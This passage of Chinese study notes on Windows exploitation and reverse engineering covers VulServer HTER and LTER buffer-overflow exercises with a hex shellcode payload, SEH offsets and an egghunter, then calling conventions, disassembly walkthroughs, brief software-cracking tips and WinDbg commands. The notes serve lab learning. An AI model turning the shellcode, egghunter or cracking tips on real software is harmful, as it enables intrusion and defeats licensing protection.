+<pre><code>all = &quot;HTER AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot; + &quot;af115062&quot; + &quot;90&quot; * 20 + &quot;dac0d97424f4bb749627f35d2bc9b132315d1783c504032985c5062d418be9cd92ec6028a32c1639949c5c6f1956309baa1a9dac1b90fb839c8938821ed06c641e1b616567468837300c3fa73558fc4c054c84b1de6fa56454366587b9422c9fde6fe614141bf9fc64e456c14817a6066ec8dd7e8c75e645eea1635d4821d3b968e6824a6643c0146b52052f97dfa8ff119b8edb7a7fae7a272ecf9c888f75d725db07ba231a95c1061ca5c936759442d90229819dedcb03e88555c651c8653d95f5e5b76602f5b2634eb12f1edf544f8de07c215e6b1acdc1f7ca487a9d12&quot;
+</code></pre>
+<p><img alt="" src="../../images/Snipaste_2023-10-16_15-31-58.jpg" /></p>
+<h5 id="g">练习G</h5>
+<p>VulServer中的LTER命令
+<code>./</code>后跟多个字符触发溢出，溢出到SEH</p>
+<p><img alt="" src="../../images/Snipaste_2023-10-17_16-49-24.jpg" /></p>
+<p><img alt="" src="../../images/Snipaste_2023-10-17_16-50-37.jpg" /></p>
+<p>计算SEH和NSEH偏移量，上面是SEH，下面是NSEH</p>
+<pre><code>└─# msf-pattern_offset -q 6f45346f                                                      
+[*] Exact match at offset 3553
+
+└─# msf-pattern_offset -q 45336f45                                                      
+[*] Exact match at offset 3549
+
+</code></pre>
+<p>测试覆盖SEH</p>
+<p><img alt="" src="../../images/Snipaste_2023-10-17_16-55-01.jpg" /></p>
+<p>测试坏字符，结果为<code>\x80</code>到<code>\xff</code>字符都被转换成了<code>\x01</code>到<code>\x7f</code>之间的字符。</p>
+<p>ASCII字符范围是<code>\x00</code>到<code>\x7f</code>，LTER命令仅接受ASCII字符，会对ASCII以外的字符进行转换</p>
+<p><img alt="" src="../../images/Snipaste_2023-10-17_17-15-38.jpg" /></p>
+<p>用mona找到合适的seh利用指令组地址，仅有ASCII字符的地址 <code>6250120b</code>
+<img alt="" src="../../images/Snipaste_2023-10-17_17-19-54.jpg" /></p>
+<p>跟踪之后确认覆盖了SEH</p>
+<p><img alt="" src="../../images/Snipaste_2023-10-17_17-30-55.jpg" /></p>
+<p>下一步是跳出SEH区，短跳指令<code>jmp</code>的16进制<code>\xeb</code>是坏字符，使用条件跳转</p>
+<h3 id="_29">代码执行流重定向流指令</h3>
+<p>在能控制寄存器值的情况下可以组合使用</p>
+<pre><code>jmp esp   //FFE4
+call esp  //FFD4
+pop eax; call eax
+</code></pre>
+<h3 id="egghunter">egghunter</h3>
+<p>PWND</p>
+<pre><code>egghunter=b&quot;&quot;
+egghunter+=b&quot;\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53&quot;
+egghunter+=b&quot;\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c&quot;
+egghunter+=b&quot;\x05\x74\xdf\xb8\x50\x57\x4e\x44\x8b\xfa\xaf\x75\xda\xaf\x75\xd7&quot;
+egghunter+=b&quot;\xff\xe7&quot;
+</code></pre>
+<h3 id="_30">用户模块和系统模块重定向指令地址问题</h3>
+<p>用户模块中指令的地址在不同系统上是不变的，系统模块中指令的地址在不同系统上是不同的。
+如果使用用户模块的重定向语句的地址不会有什么问题，但如果使用系统模块上的重定向语句地址，这就会导致本地测试成功的<code>EIP</code>地址在目标机器上不可用。</p>
+<p><em>!!系统模块中的指令地址在不同系统版本是不同的。</em></p>
+<h3 id="rop">ROP</h3>
+<p>https://cwinfosec.org/Intro-ROP-DEP-Bypass/
+https://fluidattacks.com/blog/vulnserver-trun-rop/
+https://ctf101.org/binary-exploitation/return-oriented-programming/</p>
+<h3 id="seh">SEH溢出攻击</h3>
+<p>https://learn.microsoft.com/zh-tw/cpp/cpp/structured-exception-handling-c-cpp?view=msvc-170
+https://blog.30cm.tw/2015/05/windowsbuffer-overflowsehshellcode.html
+https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/seh-based-buffer-overflow</p>
+<p>SEH是windows上处理异常的机制，异常会由SEH链一层层转入系统底层。
+在<code>TIB</code>中，有一个<code>ExceptionList</code>链表，链表中有一个<code>_EXCEPTION_REGISTRATION_RECORD</code>结构体。
+当数据溢出到<code>_EXCEPTION_REGISTRATION_RECORD</code>的指针上时，会导致SEH溢出攻击</p>
+<pre><code>typedef struct _EXCEPTION_REGISTRATION_RECORD {
+     struct _EXCEPTION_REGISTRATION_RECORD *Prev; 
+     PEXCEPTION_ROUTINE Handler; 
+} EXCEPTION_REGISTRATION_RECORD;
+</code></pre>
+<h3 id="aslraddress-space-layout-randomization">ASLR(<em>Address Space Layout Randomization</em>)地址空间随机化</h3>
+<p>ASLR使程序每次执行时，内存中的堆、栈BBS等数据每次存放在不同的内存地址，使得查找偏移难度变大。</p>
+<h3 id="_31">调用约定</h3>
+<p>CPU在处理函数中的参数时的一种调用约定方法，不同的调用约定使用的寄存器和规则不尽相同</p>
+<h4 id="fastcall">Fastcall</h4>
+<p>Fastcall是x64 Windows的调用约定，Windows上的fastcall默认使用4个寄存器。</p>
+<h5 id="fast-call">Fast call的工作模式</h5>
+<pre><code>- 前4个参数在寄存器中传递
+- 非浮点值(浮点数或双精度浮点数)的参数将通过RCX、RDX、R8和R9(按此顺序)传递。非浮点值包括指针、整数、布尔值、字符等
+- 浮点参数将通过XMM0、XMM1、XMM2和XMM3传递(按此顺序)，浮点数包括浮点数和双精度浮点数
+- 如果传递的参数太大，无法装入寄存器，则通过引用传递
+- 参数永远不会分布在多个寄存器中。其他参数都放在栈上。
+- 基指针(base pointer, RBP)被保存，以便恢复。
+- 如果函数的返回值是整数、bool、char等，则通过RAX传递，如果是浮点数或double，则通过XMM0传递。
+- 成员函数(属于类/结构体的函数)有一个表示this指针的隐式第一个参数。因为它是一个指针，它将通过RCX.[1]传递
+- 调用者负责为被调用者的参数分配空间。调用者必须总是为4个参数分配空间，即使没有传递参数。
+- 寄存器RAX、RCX、RDX、R8、R9、R10、R11被认为是易失的，在函数调用时必须被认为是被销毁的(除非有其他安全证明——通过分析，如整个程序优化)。
+- 寄存器RBX、RBP、RDI、RSI、RSP、R12、R13、R14和R15被认为是非易失的，必须通过使用它们的函数来保存和恢复
+</code></pre>
+<p>函数中参数的传递顺序如下</p>
+<pre><code>MOV DWORD PTR SS:[RSP + 0x38], 0x8 ;同理
+MOV DWORD PTR SS:[RSP + 0x30], 0x7 ;同理
+MOV DWORD PTR SS:[RSP + 0x28], 0x6 ;第六个参数传给DWORD指针，由于是双字，所以RSP地址是RSP+0X28
+MOV DWORD PTR SS:[RSP + 0x20], 0x5 ;第五个参数传给DWORD指针，地址是RSP+0X20
+MOV R9D, 0x4  ;第四个参数给R9D
+MOV R8D, 0x3  ;第三个参数给R8D
+MOV EDX, 0x2  ;第二个参数给EDX
+MOV ECX, 0x1  ;第一个参数给ECX
+CALL function
+</code></pre>
+<h4 id="cdecl">cdecl</h4>
+<p>cdecl是C语言调用约定</p>
+<p>windows x86是用cdecl调用约定</p>
+<pre><code>- 参数在栈上向后传递(从右到左),依照栈先入后出的规矩，先传递最后的参数，好让前面的参数先出来。不使用寄存器
+- 基指针(base pointer, RBP)被保存，以便恢复。
+- 返回值通过EAX传递，如果是返回值是字节或字符部分，则使用EAX更低位返回
+- 调用者清除堆栈。这就是cdecl的特别之处。因为调用者会清除堆栈，所以cdecl允许可变数量的参数。
+- 32位的x86，在栈上传参
+- linux上64位的x86，RDI、RSI、RDX、RCX、R8和R9中按顺序放置最多6个参数，其余参数在栈上
+- 
+
+</code></pre>
+<h4 id="stdcall">stdcall</h4>
+<p>Standard Calling标准调用约定，在32位的dll文件中使用的是这种</p>
+<pre><code>- 参数从右到左在栈上传递，不适用寄存器
+- 被调用函数清除栈，只能允许固定数量参数的函数
+
+</code></pre>
+<h3 id="exe">简单exe分析</h3>
+<h4 id="printf">Printf函数</h4>
+<p>通过字符串定位到函数位置，本例中知道Hello Word字符串就是main函数中的
+<img alt="" src="../../images/20230919111712.png" /></p>
+<p>通过xAnalyzer插件可以分析出函数位置，带<code>$</code>并下面有段括号的属于函数段
+<img alt="" src="../../images/20230919112420.png" /></p>
+<pre><code>SUB RSP,0x28     //RSP减了一个值。属于函数序言
+LEA RCX,QWORD PTR DS:[0x7FF6FA32E430]  //将0x7FF6FA32E430地址指到RCX，在Fastcall中，RCX是用于给函数传参的第一个值。在这里是将Hello Word传给了printf
+
+CALL &lt;consoleapplication2.sub_7FF6FA311010&gt; //调用函数，这里是printf函数
+XOR EAX,EAX   //异或EAX，异或自身结果为0
+ADD RSP,0x28  //还原栈
+RET  //返回调用,main函数结果
+</code></pre>
+<h4 id="_32">循环</h4>
+<p><img alt="" src="../../images/20230919132548.png" /></p>
+<pre><code>EBX/RBX是循环的特征
+如图所示
+- 循环从0开始，EBX被异或成0
+- EBX为循环索引，且传给了EDX，为函数的第二个参数
+- 一个字符串的地址指到了RCX，为函数的第一个参数
+- 调用了printf函数
+- EBX递增1
+- CMP比较0xA(10)和EBX(此时为1)，EBX = EBX - 0xA
+- JL根据S标志位跳转，由于上一步结果是1-10为负数，所以SF为1，则跳转
+</code></pre>
+<h3 id="dll">简单DLL分析</h3>
+<p>这是此dll中的导入函数
+<img alt="" src="../../images/20230919182824.png" /></p>
+<h4 id="_33">修饰函数</h4>
+<p><img alt="" src="../../images/20230919172645.png" />
+dll的导出函数中，带有<code>@</code>、<code>?</code>的都是修饰函数，如果一个函数没有被修饰，那他是C函数或者使用<code>extern "C"</code>申明了是C函数。
+修饰函数的好处是可以看到返回类型和参数</p>
+<h4 id="sayhello">调用SayHello</h4>
+<p>对应加载的exe</p>
+<pre><code class="language-c++">#include &lt;iostream&gt;
+#include &lt;Windows.h&gt;
+
+typedef void(WINAPI* aa)(void); //定义一个函数类型以供使用
+
+int main()
+{
+    HMODULE dll = LoadLibraryA(&quot;DLL.DLL&quot;); //载入dll
+
+    if (dll != NULL)
+    {
+        aa aa1 = (aa)GetProcAddress(dll, &quot;SayHello&quot;); //从dll句柄加载SayHello函数的地址，并传给自定义函数aa1
+        if (aa1 != NULL) {
+            aa1();  //调用aa1，也就是调用dll中的SayHello
+        }
+        else {
+            printf(&quot;Can't load the function.&quot;);
+        }
+    }
+}
+</code></pre>
+<h4 id="printarray">PrintArray</h4>
+<p><img alt="" src="../../images/20230920105351.png" /></p>
+<pre><code>test edx,edx   ;edx与自身进行AND比较
+jle dll.7FF960511F18   ;jle查看标志位，ZF为1也就是edx是0的情况下跳转到ret，结束函数
+</code></pre>
+<pre><code>mov qword ptr ss:[rsp+0x10],rsi    ;RSI赋给rsp+0x10地址
+push rdi    ;入栈
+</code></pre>
+<pre><code>sub rsp,0x20  ;函数序言
+</code></pre>
+<pre><code>mov qword ptr ss:[rsp+0x30],rbx   ;RBX被存到RSP+0x30位置
+mov rsi,rcx  ;第一个函数参数RCX传递给RSI
+xor ebx,ebx  ;EBX置0
+</code></pre>
+<pre><code>movsxd rdi,edx   ;第二个参数EDX传递给RDI
+mov edx,dword ptr ds:[rsi+rbx*4]     ;rsi+rbx*4地址传给edx
+</code></pre>
+<pre><code>call &lt;dll.sub_7FF9605120B0&gt;   ;调用函数，这是std::cout
+call &lt;dll.sub_7FF960514DD0&gt;   ;调用函数，这是std::end
+</code></pre>
+<pre><code>inc rbx    ;rbx自加1
+cmp rbx,rdi  ;比较rbx和rdi，rdi的值是第二个参数的值
+jl dll.7FF960511EA0   ;rbx小于第二个参数则跳转
+</code></pre>
+<h4 id="initializeplayer">InitializePlayer</h4>
+<p><img alt="" src="../../images/20230920131138.png" /></p>
+<pre><code>mov dword ptr ds:[rcx],0x20  ;0x20移动到rcx，rcx是第一个参数
+lea rdx,qword ptr ds:[0x7FF960549718]  ;这是个字符串，地址赋给了rdx，第二个参数
+
+
+</code></pre>
+<h3 id="_34">破解软件的要点</h3>
+<pre><code>- 简单加密的软件通常可以在找到关键函数后，采用JMP破解
+- 采用联网认证的软件，需要找到保护函数
+</code></pre>
+<p><img alt="" src="../../images/20230922144557.png" /></p>
+<h3 id="_35">脱壳</h3>
+<p>加壳的特点
+- 较高的熵（大于等于7）
+- 较少的导入函数
+- 特定打包器的标识</p>
+<p>根据内存分配调用和内存属性更改调用手动找到打包后的代码或提取shellcode</p>
+<h2 id="_36">概念&amp;术语</h2>
+<h3 id="uipi-user-interface-privilege-isolation">UIPI   (User Interface Privilege Isolation)</h3>
+<p>全称用户界面权限隔离，在Windows 2008后引入，禁止低权限进程利用消息机制对高权限进程进行任意操作。
+该设置默认开启，位于注册表
+<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System</code> 
+EnableUIPI项为0表示禁用功能</p>
+<h3 id="sspi-security-support-provider-interface">SSPI  (Security Support Provider Interface)</h3>
+<p>安全支持提供程序接口，可帮助客户端和服务器建立和维护安全通道，提供机密性、完整性和身份验证。
+<img alt="" src="../../images/20230915170849.png" /></p>
+<h3 id="bit-bytes">Bit &amp; Bytes</h3>
+<pre><code>Bit：0 or 1
+Nibble: 4 bits
+Byte: 8 bits
+Word: 2 bytes, 16 bits
+DWORD: 4 bytes, 32 bits
+QWORD: 8 bytes, 64 bits
+</code></pre>
+<h3 id="_37">二进制运算</h3>
+<pre><code>NOT  非
+AND  且
+OR   或
+XOR  异或，相同为0，不同为1
+</code></pre>
+<h2 id="_38">运行库&amp;函数</h2>
+<h3 id="_set_app_type">_set_app_type</h3>
+<pre><code>在启动时使用的内部函数告知 CRT，应用属于控制台应用程序还是 GUI 应用。
+</code></pre>
+<h3 id="controlfp">controlfp</h3>
+<pre><code>用来设置或者查询浮点环境的控制位，例如舍入模式、异常处理方式等
+</code></pre>
+<h3 id="_iob_func">_iob_func</h3>
+<pre><code>标准输入/输出流相关
+</code></pre>
+<h3 id="_interlockedcompareexchange64">_InterlockedCompareExchange64</h3>
+<p>对数据进行原子比较的函数，确保数据不会被改变</p>
+<p><code>LONG64 _InterlockedCompareExchange64(LONG64 volatile* Destination, LONG64 Exchange, LONG64 Comparand);</code></p>
+<p>当第一个参数Destination等于第三个参数Comparand时，将第一个参数替换为第二个参数Exchange。</p>
+<p>确保Destination的值和Exchange相等</p>
+<h2 id="seh_1">SEH</h2>
+<p>__except 异常过滤器的返回值</p>
+<pre><code class="language-C">EXCEPTION_EXECUTE_HANDLER   //EXCEPTION_EXECUTE_HANDLER的返回值向SEH发出信号，以执行__except块中的代码。
+EXCEPTION_CONTINUE_SEARCH   
+//EXCEPTION_CONTINUE_SEARCH的返回值向SEH发出信号，让它继续在其他地方搜索处理程序
+//当处理程序返回ExceptionContinueSearch时，这意味着处理程序对当前异常的恢复不感兴趣。因此，操作系统将转到下一个_EXCEPTION_REGISTRATION_RECORD并执行其处理程序。
+//如果所有处理程序不会管理当前异常,操作系统将调用当前未处理的异常过滤器。开发人员可能会调用UnhandledExceptionFilter()API安装自定义过滤器。但是,请注意,未处理的异常过滤器()并不是前面提到的异常处理程序列表的一部分。也就是说,没有_exception _register _register _record结构,它将指向这个函数
+
+EXCEPTION_CONTINUE_EXECUTION  //EXCEPTION_CONTINUE_EXECUTION的返回值向SEH发出信号，让它重新执行导致异常的相同代码(在我们的示例中，这是除法代码)。
+</code></pre>
+<p>SEH是基于线程的</p>
+<p>TIB中的结构</p>
+<pre><code class="language-C">typedef struct _NT_TIB {
+    struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList;   //第一个成员指向_EXCEPTION_REGISTRATION_RECORD结构的指针
+    PVOID StackBase;
+    PVOID StackLimit;
+    PVOID SubSystemTib;
+#if defined(_MSC_EXTENSIONS)
+    union {
+        PVOID FiberData;
+        DWORD Version;
+    };
+#else
+    PVOID FiberData;
+#endif
+    PVOID ArbitraryUserPointer;
+    struct _NT_TIB *Self;
+} NT_TIB;
+typedef NT_TIB *PNT_TIB;
+</code></pre>
+<p><code>_EXCEPTION_REGISTRATION_RECORD</code>的一个成员是下一个<code>_EXCEPTION_REGISTRATION_RECORD</code>的指针。<code>_EXCEPTION_REGISTRATION_RECORD</code>是异常处理的链表</p>
+<pre><code class="language-C">typedef struct _EXCEPTION_REGISTRATION_RECORD {
+    struct _EXCEPTION_REGISTRATION_RECORD *Next;
+    PEXCEPTION_ROUTINE Handler;
+} EXCEPTION_REGISTRATION_RECORD;
+</code></pre>
+<p>当发生异常时，操作系统查看发生故障的线程的TIB，并检索一个指向TIB中包含的_EXCEPTION_REGISTRATION_RECORD结构的指针。然后，操作系统导航到EXCEPTION_ROUTINE例程的链表，并确定这些例程中是否有任何例程将处理异常</p>
+<h2 id="apc">APC</h2>
+<p>APC(异步过程调用)是一种机制，可以在Windows中用于在特定线程的上下文中排队完成作业。</p>
+<p>当调用异步RPC方法时，可以指定一个APC例程的地址，该例程将在RPC方法完成时执行。</p>
+<p>用户模式下的两种APC
+- 用户APC:普通类型的用户APC，仅在线程处于Alertable状态时运行
+- 特殊用户APC: RS5(windows10 October 2018)中添加的一种相对较新的APC类型，强制线程进入Alertable。(MS尚未证实)</p>
+<p>用户模式下，只有当线程处于<code>Alertable</code>、<code>NtTestAlert(测试)</code>状态时，才会触发APC，使用APC注入，需要让进程处于以上状态。</p>
+<p>特殊用户APC使用<code>NtQueueApcThreadEx</code>、<code>NtQueueApcThreadEx2</code> </p>
+<h2 id="windbg">Windbg</h2>
+<p>https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debuggercmds/commands</p>
+<p>https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debugger/standard-debugging-techniques</p>
+<h3 id="_39">常用命令</h3>
+<ul>
+<li>lm 查看模块</li>
+</ul>
+<pre><code class="language-c">0:009&gt; lm
+start             end                 module name
+00007ff6`f33c0000 00007ff6`f34da000   Notepad  C (no symbols)           
+00007ffb`9a5c0000 00007ffb`9a77c000   DUI70      (deferred)             
+00007ffb`b9350000 00007ffb`b9933000   Microsoft_UI_Xaml   (deferred)             
+00007ffb`c0b40000 00007ffb`c0e78000   riched20   (deferred)             
+00007ffb`c3550000 00007ffb`c3578000   edputil    (deferred)         
+</code></pre>
+<ul>
+<li>~ 查看线程</li>
+</ul>
+<pre><code class="language-C">0:009&gt; ~
+   0  Id: f90.400c cSuspend: 1 Teb: 00000041`0f6b4000 Unfrozen
+   1  Id: f90.15ec Suspend: 1 Teb: 00000041`0f6b6000 Unfrozen
+   2  Id: f90.4a18 Suspend: 1 Teb: 00000041`0f6b8000 Unfrozen
+   3  Id: f90.3ea4 Suspend: 1 Teb: 00000041`0f6ba000 Unfrozen
+   4  Id: f90.3840 Suspend: 1 Teb: 00000041`0f6bc000 Unfrozen
+   5  Id: f90.1a50 Suspend: 1 Teb: 00000041`0f6be000 Unfrozen
+   6  Id: f90.4514 Suspend: 1 Teb: 00000041`0f6c0000 Unfrozen
+   7  Id: f90.3d30 Suspend: 1 Teb: 00000041`0f6c2000 Unfrozen
+
+</code></pre>
+<ul>
+<li>k 查看栈</li>
+</ul>
+<pre><code class="language-c">0:009&gt; k
+ # Child-SP          RetAddr               Call Site
+00 00000041`100fc558 00007ffc`02a55370     ntdll!NtCreateFile
+01 00000041`100fc560 00007ffc`02a54cdc     KERNELBASE!CreateFileInternal+0x590
+02 00000041`100fc6d0 00007ffc`02a5488c     KERNELBASE!CreateFileW+0x7c
+03 00000041`100fc750 00007ffc`02a563c0     KERNELBASE!BasepLoadLibraryAsDataFileInternal+0x4dc
+04 00000041`100fc980 00007ffc`04707ddc     KERNELBASE!LoadLibraryExW+0xe0
+05 00000041`100fc9f0 00007ffc`04707bea     SHELL32!GetShellStyleHInstance+0xcc
+06 00000041`100fcd20 00007ffc`04707ba0     SHELL32!UpdateStyle+0x1e
+07 00000041`100fcd60 00007ffc`04707a93     SHELL32!DUI_ShellStyleSheet_InitProcess+0x94
+08 00000041`100fcda0 00007ffc`0474c2d7     SHELL32!InitializeDirectUI+0x4b
+
+</code></pre>
+<ul>
+<li>u 查看当前汇编代码</li>
+</ul>
+<pre><code class="language-c">0:009&gt; u
+ntdll!NtCreateFile+0x18:
+00007ffc`0528fe18 0f1f840000000000 nop     dword ptr [rax+rax]
+ntdll!NtQueryEvent:
+00007ffc`0528fe20 4c8bd1          mov     r10,rcx
+00007ffc`0528fe23 b856000000      mov     eax,56h
+00007ffc`0528fe28 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
+00007ffc`0528fe30 7503            jne     ntdll!NtQueryEvent+0x15 (00007ffc`0528fe35)
+00007ffc`0528fe32 0f05            syscall
+00007ffc`0528fe34 c3              ret
+00007ffc`0528fe35 cd2e            int     2Eh
+
+</code></pre>
+<ul>
+<li>r 查看寄存器</li>
+</ul>
+<pre><code class="language-C">0:009&gt; r
+rax=0000000000000005 rbx=0000000000000000 rcx=00000041100fc5e0
+rdx=0000000080100080 rsi=0000000000000000 rdi=0000000000000000
+rip=00007ffc0528fe00 rsp=00000041100fc558 rbp=00000041100fc660
+ r8=00000041100fc640  r9=00000041100fc5e8 r10=ce709ee7125b9070
+r11=00000041100fc540 r12=0000000000000001 r13=0000000000000000
+r14=0000000080100080 r15=0000000000000000
+iopl=0         nv up ei ng nz na pe nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
+ntdll!NtCreateFile:
+00007ffc`0528fe00 4c8bd1          mov     r10,rcx
+0:009&gt; r al
+al=5
+0:009&gt; r eax
+eax=5
+0:009&gt; r rax
+rax=0000000000000005
+
+</code></pre>
+<ul>
+<li>d 查看内存</li>
+</ul>
+<pre><code class="language-C">0:009&gt; d
+00007ffc`0528fe00  4c 8b d1 b8 55 00 00 00-f6 04 25 08 03 fe 7f 01  L...U.....%.....
+00007ffc`0528fe10  75 03 0f 05 c3 cd 2e c3-0f 1f 84 00 00 00 00 00  u...............
+00007ffc`0528fe20  4c 8b d1 b8 56 00 00 00-f6 04 25 08 03 fe 7f 01  L...V.....%.....
+00007ffc`0528fe30  75 03 0f 05 c3 cd 2e c3-0f 1f 84 00 00 00 00 00  u...............
+00007ffc`0528fe40  4c 8b d1 b8 57 00 00 00-f6 04 25 08 03 fe 7f 01  L...W.....%.....
+00007ffc`0528fe50  75 03 0f 05 c3 cd 2e c3-0f 1f 84 00 00 00 00 00  u...............
+00007ffc`0528fe60  4c 8b d1 b8 58 00 00 00-f6 04 25 08 03 fe 7f 01  L...X.....%.....
+00007ffc`0528fe70  75 03 0f 05 c3 cd 2e c3-0f 1f 84 00 00 00 00 00  u...............
+
+</code></pre>
+<ul>
+<li>x 匹配符号，可用来查找函数地址</li>
+</ul>
+<pre><code class="language-C">0:009&gt; x ntdll!createf*
+Breakpoint 0 hit
+ntdll!NtCreateFile:
+00007ffc`0528fe00 4c8bd1          mov     r10,rcx
+</code></pre>
+<ul>
+<li>bp、bu、bm 设置断点
+根据地址断点
+1.根据静态找到偏移量
+2.查看当前模块虚拟地址+偏移量断点</li>
+</ul>
+<pre><code class="language-C">0:002&gt; lm
+start             end                 module name
+00007ff6`07c20000 00007ff6`07c36000   a        T (no symbols)           
+00007ffb`ff880000 00007ffb`ff917000   apphelp    (deferred)             
+00007ffc`02a30000 00007ffc`02dd5000   KERNELBASE   (deferred)             
+00007ffc`02fc0000 00007ffc`03084000   KERNEL32   (pdb symbols)          E:\Windows Kits\10\Debuggers\x64\sym\kernel32.pdb\6F7660385E7D8D33ED9B5A39B03822F01\kernel32.pdb
+00007ffc`04f60000 00007ffc`05007000   msvcrt     (deferred)             
+00007ffc`051f0000 00007ffc`05407000   ntdll      (pdb symbols)          E:\Windows Kits\10\Debuggers\x64\sym\ntdll.pdb\58A282C24AEE7E03A8CF8CB0A782CE0C1\ntdll.pdb
+
+0:002&gt; u 00007ff6`07c214c7
+a+0x14c7:
+00007ff6`07c214c7 e8c7ffffff      call    a+0x1493 (00007ff6`07c21493)
+00007ff6`07c214cc 4889ca          mov     rdx,rcx
+00007ff6`07c214cf 8a02            mov     al,byte ptr [rdx]
+00007ff6`07c214d1 4883c202        add     rdx,2
+00007ff6`07c214d5 84c0            test    al,al
+00007ff6`07c214d7 7407            je      a+0x14e0 (00007ff6`07c214e0)
+00007ff6`07c214d9 83e00f          and     eax,0Fh
+00007ff6`07c214dc 01c6            add     esi,eax
+0:002&gt; bp 00007ff6`07c214c7
+
+</code></pre>
+<ul>
+<li>批量断点</li>
+</ul>
+<pre><code class="language-C">0:000&gt; bm ntdll!ZwTer*
+  2: 00007ffc`05292d30 @!&quot;ntdll!ZwTerminateJobObject&quot;
+  3: 00007ffc`05292d10 @!&quot;ntdll!ZwTerminateEnclave&quot;
+  4: 00007ffc`0528fdc0 @!&quot;ntdll!ZwTerminateThread&quot;
+  5: 00007ffc`0528f8e0 @!&quot;ntdll!ZwTerminateProcess&quot;
+0:000&gt; bl
+     1 e Disable Clear  00007ff6`07c214cc     0001 (0001)  0:**** a+0x14cc
+     2 e Disable Clear  00007ffc`05292d30     0001 (0001)  0:**** ntdll!NtTerminateJobObject
+     3 e Disable Clear  00007ffc`05292d10     0001 (0001)  0:**** ntdll!NtTerminateEnclave
+     4 e Disable Clear  00007ffc`0528fdc0     0001 (0001)  0:**** ntdll!NtTerminateThread
+     5 e Disable Clear  00007ffc`0528f8e0     0001 (0001)  0:**** ntdll!NtTerminateProcess
+
+</code></pre>
+<ul>
+<li>搜索内存空间</li>
+</ul>
+<pre><code class="language-C">0:000&gt; s -a 0 L?0x00007ff6ffffffff &quot;aaaaaaaa&quot;
+000000ad`83dffc4c  61 61 61 61 61 61 61 61-00 00 00 00 00 00 00 00  aaaaaaaa........
+</code></pre>
+<ul>
+<li>数据类型转换</li>
+</ul>
+<pre><code class="language-C">0:000&gt; .formats 6161616161616262
+Evaluate expression:
+  Hex:     61616161`61616262
